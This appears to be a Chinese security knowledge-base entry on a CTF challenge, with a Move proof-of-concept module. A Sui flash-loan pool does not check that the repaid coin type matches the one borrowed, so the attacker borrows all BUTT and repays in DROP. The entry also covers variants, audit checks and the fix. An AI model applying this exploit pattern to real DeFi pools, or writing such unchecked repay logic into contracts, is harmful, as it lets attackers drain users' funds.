---
id: blockchain-move-flashloan-receipt-type-confusion
title: Move 闪贷回执类型混淆：借 BUTT 还 DROP，让池子 butt 余额归零且 flashloan 解除
type: scenario
domain: blockchain
path: blockchain/move
technique: move-flashloan-receipt-type-confusion
aliases:
- Move 闪电贷类型混淆
- FlashReceipt 未绑定币种
- 借 BUTT 还 DROP
- Sui flashloan 攻击
- repay_flashloan 类型校验缺失
tags:
- blockchain
- move
- sui
- defi
- flashloan
- type-confusion
- receipt
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V204
  verified_at: '2026-11-07T02:40:25+08:00'
  notes: 已对照原文核对；FlashReceipt 类型混淆链与 exp 一致；未在链上复现
---

## 一句话结论

Move 闪贷合约 `flashloan<LP, A>` 返回的 `FlashReceipt` 虽然记录了借出币种的 `type_name`，但 `repay_flashloan<LP, A>` 只校验池子里存在币种 `A`、池子 id 和还款金额，不校验 `A` 与回执记录的借出币种一致；攻击者可借出全部 BUTT（池子 butt 余额归零），再用等值 DROP 归还，`pool.flashloan` 被置回 false，从而满足 `butt_balance == 0 && !is_flashloan` 的解题条件。

## 原理

- **闪贷流程**：`flashloan` 先 `withdraw_internal<LP,A>` 借出 `A`，生成 `FlashReceipt { pool_id, type_name: type_name::get<A>().into_string(), repay_amount: amount * (FEE_PRECISION + FEE) / FEE_PRECISION }`；`repay_flashloan<LP,A>` 解构回执，只使用 `pool_id` 与 `repay_amount`，把 `type_name` 丢弃（`type_name: _`）。
- **校验缺口**：`repay_flashloan` 的三条断言是 `contains_type<LP,A>(pool)`、`object::id(pool)==id`、`coin::value(&coin)==amount`；`contains_type` 只要求“池子里存在 A”，并不要求 A 就是借出的币种。因此借 BUTT 后用 DROP 还款也能通过。
- **为什么能归零**：`flashloan<LP,BUTT>(pool, 1000)` 取走池内全部 BUTT；攻击者把借出的 BUTT 转走（不归还），再用 1050 DROP（含 5% 手续费）调用 `repay_flashloan<LP,DROP>`，池子收下 DROP、`pool.flashloan=false`；此时 `balance_of<LP,BUTT>(pool)==0`，`is_solved` 成立。
- **初始 DROP 来源**：`claim_drop` 领取 1100 DROP；`1000 * (10000+500)/10000 = 1050`，足够还款并留下 50。
- **Move 泛型的边界**：Move 的泛型参数在运行时由类型系统保证，但函数签名允许调用者自行选择 `A`；如果回执不把 `A` 固化到类型或做显式比较，调用者就能用不同 `A` 通过“池子里有该币种”的弱校验。

## 触发条件

- 闪贷池同时支持两种以上币种（如 BUTT、DROP），且 `FlashReceipt` 不携带可强制校验的币种类型。
- `repay_flashloan<LP,A>` 只检查 `contains_type<LP,A>` / pool id / 金额，不比较回执中的 `type_name`。
- 攻击者能获得与借款等值（含手续费）的另一种币种；本例通过空投获得。
- `is_solved` 只检查目标币种余额为 0 与 `flashloan` 标志，不检查其他币种余额或借款是否真正归还。

## 利用步骤

1. `claim_drop` 领取 1100 DROP，拆出 1050 用于还款，剩余转走。
2. 调用 `flashloan<LP, BUTT>(pool, 1000)` 借出池内全部 BUTT，得到 `FlashReceipt`（记录 type_name=BUTT、repay_amount=1050）。
3. 把借出的 BUTT 转走（不归还）。
4. 调用 `repay_flashloan<LP, DROP>(pool, receipt, 1050 DROP)`：`contains_type<LP,DROP>` 通过、pool id 通过、金额通过；池子收下 DROP，`pool.flashloan=false`。
5. 调用 `get_flag`；`is_solved` 检查 `balance_of<LP,BUTT>(pool)==0 && !is_flashloan`，成立。
6. 清理：把剩余 DROP 转走。

## PoC

```move
module solve_week2::solve {
    use week2::challenge::{Challenge, get_flag, claim_drop};
    use week2::pool::{flashloan, repay_flashloan};
    use week2::lp::LP;
    use week2::butt::BUTT;
    use week2::drop::DROP;

    public fun solve_get_flag(
        challenge: &mut Challenge<LP, BUTT, DROP>,
        github_id: String,
        ctx: &mut TxContext,
    ) {
        // 1) 领取 1100 DROP，拆出 1050 用于还款
        let mut balance = claim_drop(challenge, ctx).into_balance();
        let repay = balance.split(1050).into_coin(ctx);
        let rest = balance.into_coin(ctx);
        transfer::public_transfer(rest, @0x0);

        // 2) 借出 1000 BUTT（池内全部），回执 repay_amount=1050
        let (coin_butt, receipt) = flashloan<LP, BUTT>(challenge.get_pool_mut(), 1000, ctx);
        transfer::public_transfer(coin_butt, @0x0);

        // 3) 用 DROP 而非 BUTT 归还：contains_type<LP,DROP> 通过，类型未校验
        repay_flashloan<LP, DROP>(challenge.get_pool_mut(), receipt, repay);

        // 4) 此时 BUTT 余额为 0 且 flashloan=false
        get_flag(challenge, github_id, ctx);
    }
}
```

说明：PoC 为原文 week2 exp 的整理版，未在链上执行；原文通过该流程拿到 `CTF{MoveCTF-Task2}`。原文修复方案是在 `repay_flashloan` 中比较 `receipt_type_name == type_name::get<A>().into_string()`。

## 变体与关联

- 变体（校验缺口）：回执只存字符串 type_name 但不比较；回执泛型 `FlashReceipt<A>` 但 repay 用 `FlashReceipt<B>`；回执中的 pool id 可伪造/复用。
- 变体（利用目标）：归零某一币种余额、绕过 `is_flashloan` 标志、用低价值币种偿还高价值借款。
- 关联：[[blockchain-move-lending-position-cross-instance-collateral]]（同样缺少对象/类型绑定）；[[blockchain-move-amm-swap-pre-reserve-rounding-drain]]（闪贷+AMM 组合）；[[blockchain-defi-amm-first-lp-inflation-donation-rounding]]（DeFi 取整/捐赠类攻击）；[[blockchain-defi-solana-auction-pda-reuse-bidder-state-vault-drain]]（状态/所有权绑定缺失）。
- 边界：若池子只支持单一币种、回执用泛型强制绑定、或还款后校验实际借出币种余额，该链不成立。

## 检测与防御

- 检测（审计）：`FlashReceipt` 的 `type_name` 是否被解构丢弃；`repay_flashloan` 是否比较币种类型；闪贷后是否校验各币种余额；`is_solved` 是否只检查部分状态。
- 防御：把回执定义为 `FlashReceipt<phantom A>` 或携带 `TypeName` 并在还款时与 `type_name::get<A>()` 比较；还款必须使用与借出相同的 `Coin<A>`；闪贷结束前校验借款已全额归还到同一币种池；对多币种池做不变量测试（Move Prover/单元测试）。
